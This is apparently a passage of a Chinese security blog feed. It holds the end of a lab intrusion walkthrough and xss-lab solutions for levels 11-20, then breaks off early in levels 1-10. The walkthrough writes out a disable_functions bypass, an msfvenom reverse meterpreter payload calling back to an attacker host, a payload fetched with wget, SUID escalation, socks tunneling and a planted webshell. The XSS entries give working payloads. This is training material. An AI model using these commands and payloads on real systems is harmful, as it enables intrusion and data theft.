class="line">www.ddd4.com/bypass_disablefunc.php?cmd=ifconfig&amp;outpath=/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/03/EcpxSRqBidZJ6te.png" alt="Untitled"></p><h2 id="msf可交互shell"><a href="#msf可交互shell" class="headerlink" title="msf可交互shell"></a>msf可交互shell</h2><p>既然已经getshell也可以执行命令了，就可以尝试上传个反向shell，创建一个可交互式的shell</p><p>首先生成反向shell程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.0</span><span class="number">.128</span> LPORT=<span class="number">13777</span> -f elf &gt; ddd4</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/03/O3KofIvtJ74h6DS.png" alt="Untitled"></p><p>先通过菜刀把反向shell程序上传到根目录，然后对反向shell程序进行提权，默认没有执行权限，这里提权就用上了刚才用的宝塔命令执行绕过脚本</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ddd4.com/bypass_disablefunc.php?cmd=chmod%20777%20ddd4&amp;outpath=/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure><p>现在有了执行权限</p><p><img src="https://i.loli.net/2021/10/03/azTAhC4MFrd6Z7c.png" alt="Untitled"></p><p>msf进行监听</p><p><img src="https://i.loli.net/2021/10/03/3tY2mhHoJCjafPW.png" alt="Untitled"></p><p>执行ddd4</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ddd4.com/bypass_disablefunc.php?cmd=./ddd4&amp;outpath=/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure><p>msf反弹shell成功 </p><p><img src="https://i.loli.net/2021/10/03/XCRA3N7ajg4ukmr.png" alt="Untitled"></p><p>为了更方便的操作，在msf里面可以切换shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/03/DWrCstMVaZ2fwH6.png" alt="Untitled"></p><h2 id="通过宝塔计划任务反弹shell"><a href="#通过宝塔计划任务反弹shell" class="headerlink" title="通过宝塔计划任务反弹shell"></a>通过宝塔计划任务反弹shell</h2><p>桌面存在文件bt.txt，里面有宝塔后台的ip和用户名密码</p><p>ip：<a href="http://192.168.0.122:8888/944906b5/">http://192.168.0.122:8888/944906b5/</a></p><p>用户名：gpeqnjf4</p><p>密码：d12924fa</p><p><img src="https://i.loli.net/2021/10/03/cBwQEVvfTtk6iXF.png" alt="Untitled"></p><p>找到创建计划任务的地方创建一个计划任务</p><p><img src="https://i.loli.net/2021/10/03/xPenoishYSwfT8A.png" alt="Untitled"></p><p>本机监听，准备反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp <span class="number">9001</span></span><br></pre></td></tr></table></figure><p>手动执行任务，反弹shell成功</p><p><img src="https://i.loli.net/2021/10/03/cAM7jDVfHdv1bEo.png" alt="Untitled"></p><p>权限是root</p><p><img src="https://i.loli.net/2021/10/03/te9VSM1lchWYwXr.png" alt="Untitled"></p><p>上一个部分，我们上传了一个反向shell程序ddd4到内网1号机，但是它的权限不够，可以利用这里的root权限对刚才的反向shell程序进行提权</p><p>这里getshell连接上之后进入根目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br></pre></td></tr></table></figure><p>然后再cd到www\wwwroot\<a href="http://www.ddd4.com目录,执行ddd4执行,此时ddd4是root权限/">www.ddd4.com目录，执行ddd4执行，此时ddd4是root权限</a></p><p>本地msf开启监听，反弹shell之后权限是root</p><p><img src="https://i.loli.net/2021/10/03/ltNcA3B45QLyqHf.png" alt="Untitled"></p><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>执行下面命令搜索到有guid权限的程序  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -perm -u=s <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><p>利用find程序进行提权</p><h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><p>sudo提权需要知道密码，可以通过一些linux信息收集工具收集到历史记录文件等，也许可以找到密码</p><h2 id="Linux内网权限扫描脚本"><a href="#Linux内网权限扫描脚本" class="headerlink" title="Linux内网权限扫描脚本"></a>Linux内网权限扫描脚本</h2><h3 id="LinEnum使用"><a href="#LinEnum使用" class="headerlink" title="LinEnum使用"></a>LinEnum使用</h3><p>github下载后，直接运行LinEnum.sh程序就可以了，如果要在远程主机上使用可以先在本机创建一个http服务器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p>http服务器是在哪个目录开启的，哪里就是根目录</p><p>在目标机中进行下载</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="number">192.168</span><span class="number">.0</span><span class="number">.128</span>/LinEnum.sh</span><br></pre></td></tr></table></figure><p>在目标机上执行发现权限不足，可以利用suid提权</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir testfind test -<span class="built_in">exec</span> chmod <span class="number">777</span> ./LinEnum.sh \;</span><br></pre></td></tr></table></figure><p>扫描结果 </p><p><img src="https://i.loli.net/2021/10/03/nYLZjkC3h2J1y9m.png" alt="Untitled"></p><h3 id="linux-exploit-suggester的使用"><a href="#linux-exploit-suggester的使用" class="headerlink" title="linux-exploit-suggester的使用"></a>linux-exploit-suggester的使用</h3><p>这个用来检测是否存在提权 cve 漏洞</p><p><img src="https://i.loli.net/2021/10/03/3c2O1WhyP6lwx74.png" alt="Untitled"></p><h3 id="linuxprivchecker"><a href="#linuxprivchecker" class="headerlink" title="linuxprivchecker"></a>linuxprivchecker</h3><p>检测权限以及提权漏洞检测等</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2052.png" alt="Untitled"></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2053.png" alt="Untitled"></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2054.png" alt="Untitled"></p><h2 id="Linux-socks5内网穿透"><a href="#Linux-socks5内网穿透" class="headerlink" title="Linux socks5内网穿透"></a>Linux socks5内网穿透</h2><p>1、下载ssocks0.0.1并编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure &amp;&amp; make</span><br></pre></td></tr></table></figure><p>2、进入ssocks\src目录，攻击机执行rcsocks</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2055.png" alt="Untitled"></p><p>3、进入内网1号机，执行rssocks程序</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2056.png" alt="Untitled"></p><p>4、攻击机设置proxychains代理</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2057.png" alt="Untitled"></p><p>使用proxychains代理扫描内网2号机开放的端口，此时应正常扫描，说明内网穿透成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 nmap -sT -Pn <span class="number">10.10</span><span class="number">.10</span><span class="number">.128</span></span><br></pre></td></tr></table></figure><p>在浏览器里直接设置socks代理就可以直接访问web网页</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2058.png" alt="Untitled"></p><p>ddd5.com是内网2号机上部署的网站，ip为10.10.10.128，攻击机可以直接访问，也可以说明内网穿越成功</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2059.png" alt="Untitled"></p><h2 id="模板上传getshell"><a href="#模板上传getshell" class="headerlink" title="模板上传getshell"></a>模板上传getshell</h2><p>查看内网1号机的hosts文件，绑定<a href="http://www.ddd5.com,进入发现是一个博客,采用emlog搭建/">www.ddd5.com，进入发现是一个博客，采用emlog搭建</a></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2060.png" alt="Untitled"></p><p>admin\123456进入后台可以直接上传模板，可以照着emlog模板复制一份，另外加上大马和一句话木马，压缩成zip后上传</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2061.png" alt="Untitled"></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2062.png" alt="Untitled"></p><p>访问大马</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2063.png" alt="Untitled"></p><p>一句话木马执行命令</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2064.png" alt="Untitled"></p><h2 id="蚁剑穿透内网"><a href="#蚁剑穿透内网" class="headerlink" title="蚁剑穿透内网"></a>蚁剑穿透内网</h2><p>创建一个虚拟机windows7，确保可以跟内网1号机通信，因为1号机之前已经设置了代理，可以直接穿透内网</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2065.png" alt="Untitled"></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2066.png" alt="Untitled"></p><p>下面设置代理，不过不设置也可以连通 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2067.png" alt="Untitled"></p><p>进入命令行，查看可以登陆的用户信息 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2068.png" alt="Untitled"></p><h2 id="wdcp系统提权"><a href="#wdcp系统提权" class="headerlink" title="wdcp系统提权"></a>wdcp系统提权</h2><p>访问内网2号机发现是wdlinux</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2069.png" alt="Untitled"></p><p>进入8080端口访问wdcp登陆面板</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2070.png" alt="Untitled"></p><p>登陆面板进不去，不过有个phpmyadmin面板可以进去，用root\wdlinux.cn登陆进去了 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2071.png" alt="Untitled"></p><p>找到登陆面板的用户名和密码，admin\moonsec123</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2072.png" alt="Untitled"></p><p>进来了 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2073.png" alt="Untitled"></p><p>有一个命令运行器，可以看到是root权限  </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2074.png" alt="Untitled"></p><p>尝试反弹shell，提示危险命令</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2075.png" alt="Untitled"></p><p>ssh管理，这里可以下载密钥，在下载之前需要先点击生成密钥</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2076.png" alt="Untitled"></p><p>通过内网穿透代理直接ssh登陆</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2077.png" alt="Untitled"></p><p>可以看到是root权限 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2078.png" alt="Untitled"></p><p>先玩到这里~谢谢观看</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;概况&quot;&gt;&lt;a href=&quot;#概况&quot; class=&quot;headerlink&quot; title=&quot;概况&quot;&gt;&lt;/a&gt;概况&lt;/h2&gt;&lt;h3 id=&quot;攻击主机&quot;&gt;&lt;a href=&quot;#攻击主机&quot; class=&quot;headerlink&quot; title=&quot;攻击主机&quot;&gt;&lt;/a&gt;攻击主机&lt;/h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web漏洞@xss-lab 11-20关</title>
    <link href="https://tutucoo.github.io/2021/04/19/web%E6%BC%8F%E6%B4%9E@xss-lab-11-20%E5%85%B3/"/>
    <id>https://tutucoo.github.io/2021/04/19/web%E6%BC%8F%E6%B4%9E@xss-lab-11-20%E5%85%B3/</id>
    <published>2021-04-19T02:05:55.000Z</published>
    <updated>2021-11-05T02:01:25.864Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-lab-11-20关"><a href="#xss-lab-11-20关" class="headerlink" title="xss-lab 11-20关"></a>xss-lab 11-20关</h1><h2 id="第十一关-Referer存在的xss"><a href="#第十一关-Referer存在的xss" class="headerlink" title="第十一关 Referer存在的xss"></a>第十一关 Referer存在的xss</h2><p>套路还是跟第十题类似，按钮被隐藏  输入exp进行测试 </p><p><img src="https://i.loli.net/2021/04/19/JDeZU7HwpnBFVWR.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled.png"></p><p>无论是单引号还是双引号都无法对其进行封闭，猜测引号被过滤了</p><p><img src="https://i.loli.net/2021/04/19/DrF9S1YyIGm7lQ4.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%201.png"></p><p>我们看下源码，到底进行了哪些防护</p><p>可以看到，不仅对t_sort的字符串进行了实体化操作，而且增加了对HTTP_REFERER的过滤，不允许字符串中包含大小括号</p><p><img src="https://i.loli.net/2021/04/19/5ZoxEs1yFjLmHzk.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%202.png"></p><p>这样一来，由于无法用单引或双引号进行闭合，就只能用大小括号进行闭合，现在连大小括号都过滤了，因此无法闭合。</p><p>山穷水覆疑无路，柳暗花明又一村，这里接收了HTTP_REFERER参数，我们就可以对这个参数进行输入</p><p>隐藏的输入框有个t_ref，通过源码比对也知道，它就是用来接收Referer的值的，但是这里直接对其进行请求是无法注入的，不过可以通过hackbar进行注入</p><p><img src="https://i.loli.net/2021/04/19/wGI7cZ8pbktgrhq.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%203.png"></p><p>最终exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert() type&#x3D;&quot;button&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/19/nSeVfwj48ogsMOu.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%204.png"></p><h2 id="第十二关-User-Agent存在的xss"><a href="#第十二关-User-Agent存在的xss" class="headerlink" title="第十二关 User-Agent存在的xss"></a>第十二关 User-Agent存在的xss</h2><p>看一下隐藏的元素，有个ua，这跟上一关应该类似，只不过这次是利用的User-Agent</p><p><img src="https://i.loli.net/2021/04/19/yPn3jLuleRoGIUW.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%205.png"></p><p>就不多说了，最终exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert() type&#x3D;&quot;button&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/19/b92h3QWoyuFR5ca.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%206.png"></p><h2 id="第十三关-Cookie存在的xss"><a href="#第十三关-Cookie存在的xss" class="headerlink" title="第十三关 Cookie存在的xss"></a>第十三关 Cookie存在的xss</h2><p>t_sort可注入，但是跟之前的一样，t_sort无法用引号闭合，而且过滤了括号，因为没法闭合，所以无法执行我们的代码，看到有个t_cook，就明白了，这是利用了cookie</p><p><img src="https://i.loli.net/2021/04/19/x1yQoTfUE5ZDqN9.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%207.png"></p><p>跟之前两关一样的操作，不过并没有xss</p><p><img src="https://i.loli.net/2021/04/19/HPiTjJQOM1R65Cv.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%208.png"></p><p>看了一下源码，确实是利用的cookie</p><p><img src="https://i.loli.net/2021/04/19/QmPyVUtW3FZhiMT.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%209.png"></p><p>不过这里需要添加user作为key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;&quot; onclick&#x3D;alert() type&#x3D;&quot;button&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/19/mnzp2BJiLedWlPE.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2010.png"></p><h2 id="第十四关-exif-xss"><a href="#第十四关-exif-xss" class="headerlink" title="第十四关 exif xss"></a>第十四关 exif xss</h2><p>这是一个罕见的exif xss，但是由于exifviewer好像不支持上传了，现在也已经无法复现了</p><h2 id="第十五关-angular-js-xss"><a href="#第十五关-angular-js-xss" class="headerlink" title="第十五关 angular js xss"></a>第十五关 angular js xss</h2><p>这一关通过第十四关跳转过来，有个src的参数</p><p><img src="https://i.loli.net/2021/04/19/AhvwzatqDFE64nB.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2011.png"></p><p>发现src的值会注入到这里，ngInclude是angular js独有的，相当于php的include函数 </p><p><img src="https://i.loli.net/2021/04/19/cz5pqknslPECwbo.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2012.png"></p><p>看下源码，是通过echo执行了这里的代码</p><p><img src="https://i.loli.net/2021/04/19/NAQEn4Ykwop8Pia.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2013.png"></p><p>我们包含一下level1进来，使用下面的exp，level1的xss就可以直接拿来用了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.21&#x2F;xss-lab&#x2F;level15.php?src&#x3D;&#39;level1.php?name&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&#39;</span><br></pre></td></tr></table></figure><p>执行没有效果，考虑是有过滤，看下源码，发现调用了htmlspecialchars函数，对括号、引号、&amp;号进行了过滤，但是这里奇怪的是，使用&lt;img又是可以的，htmlspecialchars函数是会过滤括号的，这里使用了括号怎么就可以了？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.21&#x2F;xss-lab&#x2F;level15.php?src&#x3D;&#39;level1.php?name&#x3D;&lt;img src&#x3D;1 onerror&#x3D;alert()&gt;&#39;</span><br></pre></td></tr></table></figure><h2 id="第十六关-空格过滤"><a href="#第十六关-空格过滤" class="headerlink" title="第十六关 空格过滤"></a>第十六关 空格过滤</h2><p>进来看来keyword参数，随便试一试</p><p><img src="https://i.loli.net/2021/04/19/AVTQzdoZvcHSRwP.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2014.png"></p><p>可以看到对一些字符进行了过滤，替换成了空格的html实体编码&amp;nbsp</p><p><img src="https://i.loli.net/2021/04/19/8X7MUOld4NvCi1k.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2015.png"></p><p>看下过滤的方式，可以看到对空格和/进行了过滤</p><p><img src="https://i.loli.net/2021/04/19/xjazDSlE6FmWrcT.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2016.png"></p><p>空格可以用%0D进行代替，%0D是URL编码表示归位</p><p>最终exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.21&#x2F;xss-lab&#x2F;level16.php?keyword&#x3D;%3Cimg%0Dsrc&#x3D;1%0Donerror&#x3D;alert()%3E</span><br></pre></td></tr></table></figure><h2 id="第十七关-flash控件xss"><a href="#第十七关-flash控件xss" class="headerlink" title="第十七关 flash控件xss"></a>第十七关 flash控件xss</h2><p>由于现在对flash不再支持，所以插件无法显示，但是不影响复现</p><p><img src="https://i.loli.net/2021/04/19/TApZnzVWtFGIb4h.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2017.png"></p><p>对两个参数进行操作，发现arg01作为变量，而arg02作为值，这样就可以用arg02测试xss了</p><p><img src="https://i.loli.net/2021/04/19/SHbVlQJAK3U1vth.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2018.png"></p><p>可以看到对两个参数都进行了引号、括号、&amp;号过滤</p><p><img src="https://i.loli.net/2021/04/19/6O9NsIvS3RcjloL.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2019.png"></p><p>经过测试，括号用``代替，绕过htmlspecialchars函数，因为是embed控件，查看它的属性，发现只有type没有用，但是这个属性并没有能够触发xss，查看它支持的事件，采用onmouseover事件进行测试(onmouseover前面必须有空格，属性之间必须有空格)，最终exp如下，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.21&#x2F;xss-lab&#x2F;level17.php?arg01&#x3D;dddd&amp;arg02&#x3D; onmouseover&#x3D;alert&#96;1&#96;</span><br></pre></td></tr></table></figure><h2 id="第十八关-flash控件xss"><a href="#第十八关-flash控件xss" class="headerlink" title="第十八关 flash控件xss"></a>第十八关 flash控件xss</h2><p>首页也是类似的</p><p><img src="https://i.loli.net/2021/04/19/yx3IUgwDMZfmPoF.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2020.png"></p><p>exp同第十七关完全一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.21&#x2F;xss-lab&#x2F;level17.php?arg01&#x3D;dddd&amp;arg02&#x3D; onmouseover&#x3D;alert&#96;1&#96;</span><br></pre></td></tr></table></figure><h2 id="第十九关-flash控件xss"><a href="#第十九关-flash控件xss" class="headerlink" title="第十九关 flash控件xss"></a>第十九关 flash控件xss</h2><p>本关进行之前需要了解flash xss:</p><p>Flash XSS攻击总结 杀死那个石家庄人/ 菲哥哥:<a href="https://www.secpulse.com/archives/44299.html">https://www.secpulse.com/archives/44299.html</a></p><p>这一类的xss比较少见，更多技术细节参见：</p><p>那些年我们一起学xss:<a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/14.html">https://wizardforcel.gitbooks.io/xss-naxienian/content/14.html</a></p><p>payload flash xss</p><p><img src="https://i.loli.net/2021/04/19/4manwFxdISEet1M.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2021.png"></p><p><img src="https://i.loli.net/2021/04/19/VNjG5KPsmaHAyDc.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2022.png"></p><h2 id="第二十关-flash控件xss"><a href="#第二十关-flash控件xss" class="headerlink" title="第二十关 flash控件xss"></a>第二十关 flash控件xss</h2><p>这一题用到了zeroclipboard xss，具体可以参考这篇文章：</p><p><a href="https://www.freebuf.com/sectool/108568.html">https://www.freebuf.com/sectool/108568.html</a></p><p>国内广泛使用了zeroclipboard.swf，主要的功能是复制内容到剪切板，中间由flash进行中转保证兼容主流浏览器，具体做法就是使这个透明的flash漂浮在复制按钮之上</p><p>看一下源码：</p><p>使用jpexs反编译(swf反编译工具：<a href="https://github.com/jindrapetrik/jpexs-decompiler">https://github.com/jindrapetrik/jpexs-decompiler</a></p><p>)</p><p>原因显而易见，Externalinterface.call第二个参数传回来的id没有正确过滤导致xss</p><p><img src="https://i.loli.net/2021/04/19/uTsEYGUmQexPgXL.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2023.png"></p><p>payload</p><p><img src="https://i.loli.net/2021/04/19/GrR5nM8Jvp1zA4x.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2024.png"></p><p><img src="https://i.loli.net/2021/04/19/dkca5GHt8TpsRZf.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2025.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss-lab-11-20关&quot;&gt;&lt;a href=&quot;#xss-lab-11-20关&quot; class=&quot;headerlink&quot; title=&quot;xss-lab 11-20关&quot;&gt;&lt;/a&gt;xss-lab 11-20关&lt;/h1&gt;&lt;h2 id=&quot;第十一关-Referer存在的xs</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web漏洞@xss-lab 1-10关</title>
    <link href="https://tutucoo.github.io/2021/04/19/web%E6%BC%8F%E6%B4%9E@xss-lab-1-10%E5%85%B3/"/>
    <id>https://tutucoo.github.io/2021/04/19/web%E6%BC%8F%E6%B4%9E@xss-lab-1-10%E5%85%B3/</id>
    <published>2021-04-19T01:52:14.000Z</published>
    <updated>2021-11-05T02:01:25.864Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-lab-1-10关"><a href="#xss-lab-1-10关" class="headerlink" title="xss-lab 1-10关"></a>xss-lab 1-10关</h1><h2 id="第一关-get参数存在xss"><a href="#第一关-get参数存在xss" class="headerlink" title="第一关 get参数存在xss"></a>第一关 get参数存在xss</h2><p>没啥好说的</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled.png"></p><h2 id="第二关-输入框存在的xss"><a href="#第二关-输入框存在的xss" class="headerlink" title="第二关 输入框存在的xss"></a>第二关 输入框存在的xss</h2><p>直接输入，无果</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%201.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%201.png"></p><p>不过可以看到插入到了value属性中，因此我们可以这样做，把前面的的双引号进行闭合</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onclick=alert(1) &gt;&lt;&quot;</span></span><br></pre></td></tr></table></figure><p>最后点击输入框中触发 </p><h2 id="第三关-输入框存在的xss-htmlspecialchars过滤"><a href="#第三关-输入框存在的xss-htmlspecialchars过滤" class="headerlink" title="第三关 输入框存在的xss(htmlspecialchars过滤)"></a>第三关 输入框存在的xss(htmlspecialchars过滤)</h2><p>正常插入，依旧没有弹框，检查源码</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%202.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%202.png"></p><p>看这造型跟上一关也是差不多的呀，于是” onclick=alert(1) &gt;&lt;”</p><p>不过很遗憾，不行</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%203.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%203.png"></p><p>看下源码</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%204.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%204.png"></p><p>首先接收输入框的输入赋值给keyword，然后生成一个form，里面的输入框的值由刚才输入的payload赋值，但是这里调用了htmlspecialchars，这个函数的作用如下：</p><ul><li>将括号转换为 HTML 实体</li><li>将&amp;号转换为HTML实体</li><li>将引号转换为HTML实体</li></ul><p>因为我们输入的payload包含了大于号和小于号，所以不能使用这两个符号了</p><p>前面用双引号闭合依然不行，最后多了个双引号，为什么会出现这样的情况呢？</p><p>这需要了解一下单引号和双引号的区别:单引号中的内容不会进行解析，而双引号会进行解析，上图中我们可以发现，value的值是用单引号括起来的，因此里面的值会原封不动的显示出来</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%205.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%205.png"></p><p>所以，我们只需要通过单引号把前面的单引号封闭起来就可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=alert(1)</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%206.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%206.png"></p><h2 id="第四关-输入框存在的xss-htmlspecialchars过滤"><a href="#第四关-输入框存在的xss-htmlspecialchars过滤" class="headerlink" title="第四关 输入框存在的xss(htmlspecialchars过滤)"></a>第四关 输入框存在的xss(htmlspecialchars过滤)</h2><p>输入’ 